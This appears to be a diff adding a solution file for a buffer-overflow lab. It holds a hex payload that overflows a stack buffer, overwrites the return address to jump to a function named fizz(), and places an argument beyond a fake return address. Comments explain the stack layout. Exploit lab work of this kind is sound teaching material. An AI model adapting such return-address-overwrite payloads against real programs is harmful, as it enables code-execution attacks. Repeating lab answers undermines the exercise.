@@ -1,0 +1,8 @@
+33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 70 10 40 00 00 00 00 00 77 77 77 77 77 77 77 77 f7 48 8e 18 8e 14 00 76
+
+
+# analogous to the smoke.txt but above to the return address we set seventh argument to the procedure fizz()
+# but in order to do this we must skip the 8 bytes (filled by 77 77 77 ..... in this case) because in the moment
+# control being passed to the fizz(), %rsp points to the adrress just above the overwritten return address 
+# and this 8 bytes (filling by 77 77 77 ... ) simulates the return address to which control should be passed
+# after returning from fizz()  
